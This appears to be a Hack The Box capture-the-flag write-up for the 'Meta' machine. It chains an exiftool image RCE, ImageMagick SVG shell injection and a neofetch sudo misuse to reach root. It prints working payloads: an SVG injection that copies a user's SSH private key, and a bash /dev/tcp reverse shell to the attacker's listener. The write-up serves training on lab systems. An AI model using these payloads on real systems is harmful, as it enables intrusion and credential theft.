## Objectives
- user own
- system own

<br>

## Initial Enumeration

### Nmap Scan

`sudo nmap -sC -sV -Pn -T4 10.10.11.140`

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
```

<br>

### Gobuster Scan

`gobuster dir -u http://10.10.11.140 -t 100 -r -x php,txt,html -w dir-med.txt`

```bash
/index.php            (Status: 200) [Size: 4427]
```

<br>

## Website Digging

I add **artcorp.htb** to my hosts file with the machine's IP.

Visiting the main page:

![](images/meta1.png)

<br>

None of the links at the bottom do anything. There is no robots.txt. Also nothing interesting in the page source and no cookies set.

Not having much to go on I look for other subdomains attached to **artcorp.htb**:

`wfuzz -c --sc 200 -u http://artcorp.htb -H "Host: FUZZ.artcorp.htb" -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt`

```bash
********************************************************

We can see that there is a **dev01** subdomain which I add to my hosts file and visit site:

<br>

I dig around but there doesn't seem to be anything other than uploading an image file and getting information back on it.

When you upload an image it will give you back the exif data on it in a format that looks exactly like **exiftool**.

This got me thinking that the server is probably running exiftool on whatever we upload and then gives us the results. Are there any exiftool exploits we can use? Time to find out.

<br>

## System Access - CVE-2021-22204

I find **CVE-2021-22204** and it looks like we can embed a **reverse shell in an image file** and get exiftool to trigger it.

I find [**this exploit**](https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py) on GitHub but have problems running it. I do get it to generate the payload file however.

[**I then find this blog post**](https://amalmurali47.medium.com/an-image-speaks-a-thousand-rces-the-tale-of-reversing-an-exiftool-cve-585f4f040850) that walks you through creating the exploit image and I used the payload from the GitHub exploit to create it.

After that I start a listener up on my system and upload the exploit image, which gets us a shell:

```
listening on [any] 4444 ...
connect to [<MY IP>] from (UNKNOWN) [10.10.11.140] 60224
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

<br>

## System Enumeration

I upload **linPEAS** and run it, but don't find much interesting other than the following:

```
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/local/bin/convert_images.sh
```

<br>

## CVE-2022-29599

Taking a look at that shell script:

```
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

I look up what **mogrify** is, which I'm guessing got it's name from transmogrify, and it's part of the **ImageMagick** suite of tools used for transforming images.

The script here goes into the **convert_images folder** and then changes everything there into .png files. And it just so happens that this is set up to automatically run once a minute.

The help text shows us we can look at the version:

`mogrify -version`

```
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
```

I do a search for **mogrify exploits** and find **CVE-2022-29599** which allows RCE among other things due to:

```
ImageMagick before 6.9.11-40 and 7.x before 7.0.10-40 mishandles the -authenticate option, which allows setting a password for password-protected PDF files. The user-controlled password was not properly escaped/sanitized and it was therefore possible to inject additional shell commands via coders/pdf.c.
```

The person who discovered this issue created a [**blog post that you can find here**](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html) that explains the issue in further detail and provides examples.

I use their **poc.svg example** near the bottom and modify it slightly so that the output is placed in **/dev/shm** and then copy it over to the **/var/www/dev01.artcorp.htb/convert_images/** directory. When the **convert_images.sh** script next runs it should trigger the exploit.

```
<image authenticate='ff" `echo $(whoami)> /dev/shm/whoami`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:test.svg" height="100" width="100"/>
  </svg>
</image>
```

`cp test.svg /var/www/dev01.artcorp.htb/convert_images/`

Looking in the **/dev/shm** directory shows that it worked, and that it runs under user **thomas**:

```
www-data@meta:/dev/shm$ ls -al
total 4
drwxrwxrwt  2 root   root     60 Apr 17 22:13 .
drwxr-xr-x 16 root   root   3080 Apr 17 22:07 ..
-rw-r--r--  1 thomas thomas    7 Apr 17 22:14 whoami
www-data@meta:/dev/shm$ cat whoami
thomas
```

Looking in the **thomas** home directory shows us that the **user.txt** flag is there but even more interesting there is a **.ssh folder**. If he has a private ssh key we should be able to do what we just did above to view it:

```
total 32
drwxr-xr-x 4 thomas thomas 4096 Jan 17 07:53 .
drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..
lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -> /dev/null
-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout
-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc
drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config
-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile
drwx------ 2 thomas thomas 4096 Jan  4 10:22 .ssh
-rw-r----- 1 root   thomas   33 Apr 17 22:08 user.txt
```

I create another .svg exploit file based on the one above and change it to see if I can get their private key, and then copy it over to the convert_images folder:

```
<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:test2.svg" height="100" width="100"/>
  </svg>
</image>
```

And sure enough about a minute later the file shows up and includes their private key.

```
total 8
drwxrwxrwt  2 root   root     80 Apr 17 22:34 .
drwxr-xr-x 16 root   root   3080 Apr 17 22:07 ..
-rw-r--r--  1 thomas thomas 2590 Apr 17 22:34 id_rsa
-rw-r--r--  1 thomas thomas    7 Apr 17 22:14 whoami
```

I copy the private key to a file on my system and ssh over as **thomas**:

`ssh -i id_rsa thomas@artcorp.htb`

```

thomas@meta:~$
```

I grab the **user.txt** flag and submit it on HTB.

Checking `sudo -l` shows us that thomas can run:

```
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

I wasn't sure what **neofetch** was so I read up on it:

```
Neofetch is a command-line system information tool written in bash 3.2+. Neofetch displays information about your operating system, software and hardware in an aesthetic and visually pleasing way.
```

I've watched some streamers on Twitch and I'm betting this, or another tool very similar to it, is how they add that extra info to their terminals whenever they open a new one.

![](images/meta3.png)

<br>

I check [**GTFOBins**](https://gtfobins.github.io/gtfobins/neofetch/) and there is a way to break out of neofetch:

```
LFILE=file_to_read
sudo neofetch --ascii $LFILE
```

Unfortunately we don't have the password for thomas so we can't do this.

I find a **config file for neofetch** in his home directory:

```
thomas@meta:~/.config/neofetch$ ls -al
total 24
drwxr-xr-x 2 thomas thomas  4096 Dec 20 08:33 .
drwxr-xr-x 3 thomas thomas  4096 Aug 30  2021 ..
-rw-r--r-- 1 thomas thomas 14591 Aug 30  2021 config.conf
```

When you run neofetch it reads from this file and it looks like it also has the ability to run commands. If I can point to a different .conf file I should be able to get a root reverse shell that way.

Looking in `env` shows us some XDG variables so we should be able to use **XDG_CONFIG_HOME** here. What this does:

```
$XDG_CONFIG_HOME defines the base directory relative to which user-specific configuration files should be stored. If $XDG_CONFIG_HOME is either not set or empty, a default equal to $HOME/.config should be used. 
```

Changing the config.conf file to:

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/<MY IP>/4444 0>&1"
```

Exporting the environmental variable:

```
export XDG_CONFIG_HOME="$HOME/.config"
```

`env`

```
XDG_CONFIG_HOME=/home/thomas/.config
```

Setting up a listener to catch a reverse shell back from root and then running our sudo command:

`sudo -u root /usr/bin/neofetch \"\"`

```
listening on [any] 4444 ...
connect to [<MY IP>] from (UNKNOWN) [10.10.11.140] 39338
root@meta:/home/thomas/.config/neofetch# 
```

And we have root! I grab the **root.txt** flag and submit it over to HTB.

<br>

With that we've completed this CTF!

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration with **nmap** and **gobuster**
- Finding additional subdomains with **wfuzz**
- Exploiting **CVE-2021-22204**, which is a bug in **exiftool**, to obtain a reverse shell
- Finding an odd shell script that runs the **ImageMagick mogrify** command once a minute, and then exploting **CVE-2022-29599** against mogrify to obtain RCE as a different user
- Finding we can run **neofetch** as root and abusing the **XDG_CONFIG_HOME** setting so it ran a .conf file of our choosing, which gave us a reverse root shell
